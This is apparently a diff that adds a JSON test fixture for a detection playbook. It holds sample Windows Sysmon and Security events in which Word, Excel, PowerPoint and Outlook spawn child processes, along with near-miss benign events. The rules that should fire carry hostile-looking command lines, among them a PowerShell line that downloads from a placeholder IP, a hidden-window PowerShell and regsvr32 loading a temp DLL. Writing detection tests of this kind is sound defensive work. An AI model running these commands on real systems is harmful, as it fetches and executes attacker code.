@@ -1,0 +1,97 @@
+{
+ "playbook": "signal_office_child_process",
+ "fires": [
+  {
+   "rule": "Office Spawns Shell",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 1,
+      "windows.channel": "Microsoft-Windows-Sysmon/Operational",
+      "Image": "C:\\Windows\\System32\\cmd.exe",
+      "CommandLine": "cmd.exe /c powershell -nop -c iwr http://203.0.113.7/a",
+      "User": "CORP\\alice",
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "Office Spawns Script Engine",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\wscript.exe",
+      "CommandLine": "wscript.exe C:\\Users\\alice\\AppData\\Local\\Temp\\inv.vbs",
+      "SubjectUserName": "alice",
+      "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "Office Spawns LOLBin",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 1,
+      "windows.channel": "Microsoft-Windows-Sysmon/Operational",
+      "Image": "C:\\Windows\\System32\\regsvr32.exe",
+      "CommandLine": "regsvr32 /s C:\\Users\\alice\\AppData\\Local\\Temp\\x.dll",
+      "User": "CORP\\alice",
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "Outlook Spawns Process",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 1,
+      "windows.channel": "Microsoft-Windows-Sysmon/Operational",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell -w hidden -c ...",
+      "User": "CORP\\alice",
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
+     }
+    }
+   ]
+  }
+ ],
+ "near_miss": [
+  {
+   "name": "Word started from Explorer",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 1,
+      "windows.channel": "Microsoft-Windows-Sysmon/Operational",
+      "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "CommandLine": "WINWORD.EXE C:\\Users\\alice\\Documents\\a.docx",
+      "User": "CORP\\alice",
+      "ParentImage": "C:\\Windows\\explorer.exe"
+     }
+    }
+   ]
+  },
+  {
+   "name": "Excel starting its own helper",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 1,
+      "windows.channel": "Microsoft-Windows-Sysmon/Operational",
+      "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\splwow64.exe",
+      "CommandLine": "splwow64.exe 8192",
+      "User": "CORP\\alice",
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
+     }
+    }
+   ]
+  }
+ ]
+}
